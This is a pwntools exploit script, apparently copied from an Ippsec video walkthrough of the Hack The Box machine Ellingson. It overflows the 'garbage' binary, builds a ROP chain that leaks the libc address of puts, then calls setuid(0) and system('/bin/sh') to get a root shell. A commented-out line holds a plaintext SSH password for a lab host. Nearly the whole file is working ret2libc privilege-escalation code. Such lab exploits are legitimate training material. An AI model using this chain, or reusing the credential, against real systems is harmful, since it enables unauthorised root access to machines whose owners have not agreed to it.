#
# Code from Ippsec Ellingson HTB YouTube Video
#
# Ellingson YouTube https://youtu.be/XVYgBetSvS8
#

from pwn import *
context(terminal=['tmux', 'split-pane'])
#p = gdb.debug('./garbage', 'b main')


# s = ssh(host = '10.10.10.139', user = 'margo', password = 'iamgod$08')
#p = s.process('/usr/bin/garbage')

p = process("./garbage")

context(os='linux',arch='amd64')

binelf = ELF('./garbage',checksec=False)
libc   = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
rop    = ROP(binelf)

junk = "A" * 136
pop_rdi  = p64(0x40179b)  # ROPgadget 0x000000000040179b
# got_puts = p64(0x404028)  # Objdump 
# plt_puts = p64(0x401050)  # Objdump 
# plt_main = p64(0x401619)  # Objdump

rop.puts(binelf.got['puts'])
rop.raw(binelf.symbols['main'])

libc_puts    = p64(libc.symbols['puts'])   # p64(0x74040) # Readelf
libc_system  = p64(libc.symbols['system']) # p64(0x46ff0) # Readelf
libc_setuid  = p64(libc.symbols['setuid'])   # p64(0xc8910) # Readelf
libc_binsh   = p64(next(libc.search(b"/bin/sh")))  # p64(0x183cee) # Strings

p.sendline(junk.encode() + bytes(rop))

p.recvuntil("access denied.")
leaked_put = p.recv()[:8].strip().ljust(8, b"\x00")
log.info(f"Leaked address: 0x{leaked_put.hex()}")

offset = u64(leaked_put) - u64(libc_puts)
log.info(f"Offset: {offset}")

system_loc = (u64(libc_system) + offset).to_bytes(8, byteorder='little')
setuid_loc = (u64(libc_setuid) + offset).to_bytes(8, byteorder='little')
binsh_loc = (u64(libc_binsh) + offset).to_bytes(8, byteorder='little')

log.info(f"System: {system_loc.hex()}")
log.info(f"Setuid: {setuid_loc.hex()}")
log.info(f"/bin/sh: {binsh_loc.hex()}")

gadget_rce = pop_rdi + p64(0) + setuid_loc
gadget_rce += pop_rdi + binsh_loc + system_loc

p.sendline(junk.encode() + gadget_rce)

p.interactive()
